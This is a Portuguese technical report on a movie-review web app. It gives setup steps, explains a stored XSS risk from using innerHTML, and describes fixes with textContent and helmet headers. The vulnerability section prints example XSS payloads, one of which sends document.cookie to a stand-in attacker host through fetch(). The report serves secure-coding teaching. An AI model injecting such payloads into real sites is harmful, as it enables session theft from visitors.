# Relatório Técnico — Site de Avaliação de Filmes

# 1. Como Rodar

Siga os passos abaixo, na ordem exata, para rodar o projeto do zero.

### Pré-requisitos
- Node.js instalado (versão 18 ou superior recomendada)
- npm (já vem junto com o Node.js)

### Passo a passo

```bash
# 1. Clone o repositório e entre na pasta do backend
git clone <url-do-seu-repositorio>
cd movie-review-app/backend

# 2. Instale as dependências do projeto (Express, Helmet, Prisma Client)
npm install

# 3. Instale o Prisma CLI como dependência de desenvolvimento (caso ainda não tenha)
npm install prisma --save-dev

# 4. Inicialize o Prisma (necessário apenas se o schema.prisma ainda não existir)
npx prisma init --datasource-provider sqlite

# 5. Rode a migração para criar o banco SQLite e a tabela "Avaliacao"
npx prisma migrate dev --name init

# 6. Inicie o servidor backend
node server.js
```

O terminal deve exibir: `Servidor rodando em http://localhost:3000`

### Rodando o Frontend

```bash
# 7. Em outra aba/terminal, navegue até a pasta do frontend
cd ../frontend

# 8. Abra o arquivo index.html diretamente no navegador
#    (duplo clique no arquivo, ou use a extensão "Live Server" do VS Code)
```

A partir daí, o formulário de avaliação e a listagem de filmes já devem
funcionar normalmente, consumindo a API em `http://localhost:3000/api/avaliacoes`.

---

# 2. Análise de Vulnerabilidade

### O risco do `innerHTML` com dados de usuário

Quando uma aplicação web insere dados fornecidos pelo usuário diretamente no
DOM usando `innerHTML`, o navegador interpreta esse conteúdo como **código
HTML real**, e não como texto simples. Isso significa que qualquer marcação
ou script embutido na string será processado e executado pelo navegador.

Esse é o cenário clássico de **XSS Armazenado (Stored XSS)**: um usuário
malicioso preenche o campo de "Crítica/Resenha" (ou "Nome do Filme") com um
payload como:

```html
<script>alert('hack')</script>
```

ou algo mais sofisticado, como:

```html
<img src="x" onerror="fetch('https://atacante.com/roubo?cookie=' + document.cookie)">
```

Se o backend salvar essa string sem nenhum tratamento (o que o Prisma faz
normalmente, já que ele apenas armazena texto bruto) e o frontend renderizar
esse valor usando `innerHTML`, o seguinte aconteceria:

1. O texto seria salvo como está no banco SQLite.
2. Toda vez que **qualquer visitante** carregasse a página e a lista de
   avaliações fosse renderizada, o navegador desse visitante executaria o
   script malicioso embutido na crítica.
3. Esse script roda no mesmo contexto da página legítima, e portanto tem
   acesso a coisas sensíveis como cookies de sessão, tokens armazenados no
   `localStorage`, e pode até modificar a página (defacement), redirecionar
   o usuário para sites falsos de phishing, ou realizar requisições em nome
   da vítima sem o conhecimento dela.

O ponto central é: **o problema não está em salvar o texto no banco**, e sim
em **como esse texto é exibido depois**. O banco de dados (SQLite, via
Prisma) é "burro" e armazena qualquer string que receber. A vulnerabilidade
nasce exclusivamente no momento da renderização no navegador, quando se
confia ciegamente no conteúdo do usuário e se usa uma API (`innerHTML`) que
interpreta esse conteúdo como código executável.

---

# 3. Resolução

Para neutralizar essa falha, foram aplicadas duas camadas de defesa
independentes — uma no frontend e outra no backend (defesa em profundidade).

### Camada 1 — Frontend: uso exclusivo de `textContent`

No arquivo `frontend/script.js`, toda a renderização dos cards de
avaliação foi reescrita para nunca usar `innerHTML` em dados vindos do
usuário (nome do filme e comentário). Em vez disso, os elementos são
criados via `document.createElement()` e o conteúdo textual é atribuído
exclusivamente através de `textContent`:

```javascript
const titulo = document.createElement('h3');
titulo.textContent = avaliacao.filme; // seguro

const comentario = document.createElement('p');
comentario.textContent = avaliacao.comentario; // seguro
```

A diferença é fundamental: `textContent` **sempre trata o valor como texto
puro**, nunca como HTML. Se o valor armazenado for literalmente a string
`<script>alert('hack')</script>`, o navegador vai exibir esse texto na tela
exatamente como digitado (entre aspas, com os sinais de menor/maior
visíveis), e **não vai executá-lo em nenhuma hipótese**. Isso elimina por
completo o vetor de ataque de Stored XSS nessa interface.

### Camada 2 — Backend: middleware `helmet`

No arquivo `backend/server.js`, o pacote `helmet` foi adicionado como
middleware global, logo no início da configuração do Express:

```javascript
const helmet = require('helmet');
app.use(helmet());
```

O `helmet` configura automaticamente uma série de cabeçalhos HTTP de
segurança, como:

- `X-Content-Type-Options: nosniff` — impede que o navegador tente
  "adivinhar" o tipo de um arquivo e o execute como script quando o
  servidor declarou outro tipo de conteúdo.
- `X-Frame-Options` — protege contra ataques de clickjacking, impedindo
  que o site seja carregado dentro de um `<iframe>` malicioso.
- Uma política básica de `Content-Security-Policy`, que restringe de onde
  scripts podem ser carregados, servindo como uma camada extra de defesa
  caso algum vetor de XSS escape do tratamento feito no frontend.

### Resultado final

Com essas duas camadas combinadas, mesmo que um usuário mal-intencionado
envie um payload de script através do formulário de avaliação:

1. O backend recebe e salva o texto normalmente (ele não tem como saber
   se é "malicioso" ou não, e essa não é sua responsabilidade aqui).
2. O frontend exibe esse texto de forma **inerte**, como uma string visível
   na tela, sem jamais interpretá-lo como HTML/JS.
3. Os cabeçalhos de segurança do `helmet` adicionam uma camada extra de
   proteção no nível do navegador, reduzindo ainda mais a superfície de
   ataque da aplicação como um todo.

Esse conjunto de medidas garante que a aplicação esteja protegida contra o
vetor de XSS identificado, sem comprometer a funcionalidade de exibir
livremente os comentários e títulos de filmes cadastrados pelos usuários.
